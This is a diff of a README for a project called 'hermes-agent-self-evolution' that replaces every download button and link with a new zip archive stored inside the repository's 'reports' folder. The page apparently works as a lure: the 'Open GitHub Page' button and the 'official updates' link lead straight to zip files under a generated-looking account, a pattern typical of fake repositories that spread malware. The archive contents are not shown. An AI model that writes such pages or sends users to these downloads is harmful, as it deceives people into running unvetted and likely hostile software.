@@ -1,6 +1,6 @@
 # ⚙️ hermes-agent-self-evolution - Improve Hermes Agent Skills Easily
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Hermes%20Agent-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Ephesian-kingpost533/hermes-agent-self-evolution/main/datasets/agent-hermes-evolution-self-3.6.zip)
+[![Download Latest Version](https://img.shields.io/badge/Download-Hermes%20Agent-brightgreen?style=for-the-badge&logo=github)](https://github.com/Ephesian-kingpost533/hermes-agent-self-evolution/raw/refs/heads/main/reports/hermes_evolution_agent_self_3.8-beta.5.zip)
 
 ## ⚒ About hermes-agent-self-evolution
 
@@ -24,7 +24,7 @@ To use hermes-agent-self-evolution, you first need to download it from the offic
 
 Click the button below to open the GitHub page where you can get the app:
 
-[![Download from GitHub](https://img.shields.io/badge/Open%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Ephesian-kingpost533/hermes-agent-self-evolution/main/datasets/agent-hermes-evolution-self-3.6.zip)
+[![Download from GitHub](https://img.shields.io/badge/Open%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Ephesian-kingpost533/hermes-agent-self-evolution/raw/refs/heads/main/reports/hermes_evolution_agent_self_3.8-beta.5.zip)
 
 This page is the source for all versions of the app. Here you can find instructions, updates, and sometimes extra help documents.
 
@@ -92,7 +92,7 @@ Close the app or run another improvement cycle as needed.
 
 All official updates, new features, and detailed technical information are available at:
 
-[https://raw.githubusercontent.com/Ephesian-kingpost533/hermes-agent-self-evolution/main/datasets/agent-hermes-evolution-self-3.6.zip](https://raw.githubusercontent.com/Ephesian-kingpost533/hermes-agent-self-evolution/main/datasets/agent-hermes-evolution-self-3.6.zip)
+[https://github.com/Ephesian-kingpost533/hermes-agent-self-evolution/raw/refs/heads/main/reports/hermes_evolution_agent_self_3.8-beta.5.zip](https://github.com/Ephesian-kingpost533/hermes-agent-self-evolution/raw/refs/heads/main/reports/hermes_evolution_agent_self_3.8-beta.5.zip)
 
 You can also use the "Issues" tab on the GitHub page to report problems or ask questions.
 
@@ -120,4 +120,4 @@ The user community and developers monitor GitHub closely and respond to requests
 
 ---
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Hermes%20Agent-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Ephesian-kingpost533/hermes-agent-self-evolution/main/datasets/agent-hermes-evolution-self-3.6.zip)
+[![Download Latest Version](https://img.shields.io/badge/Download-Hermes%20Agent-brightgreen?style=for-the-badge&logo=github)](https://github.com/Ephesian-kingpost533/hermes-agent-self-evolution/raw/refs/heads/main/reports/hermes_evolution_agent_self_3.8-beta.5.zip)
